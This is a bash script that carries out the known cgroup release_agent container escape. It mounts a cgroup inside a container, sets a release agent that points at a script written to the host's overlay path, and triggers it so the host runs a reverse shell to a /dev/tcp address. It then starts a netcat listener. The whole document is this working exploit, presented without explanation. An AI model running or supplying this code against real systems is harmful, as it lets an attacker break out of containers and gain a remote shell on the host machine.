#!/bin/bash
overlay=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /proc/mounts`
mkdir /tmp/escape
mount -t cgroup -o blkio cgroup /tmp/escape
mkdir -p /tmp/escape/w
echo 1 > /tmp/escape/w/notify_on_release
echo "$overlay/shell.sh" > /tmp/escape/release_agent
cat <<EOF >/shell.sh
#!/bin/bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/${POD_IP}/${PORT} 0>&1"
EOF
chmod +x /shell.sh
sleep 3 && echo 0 >/tmp/escape/w/cgroup.procs &
nc -l -p 9001
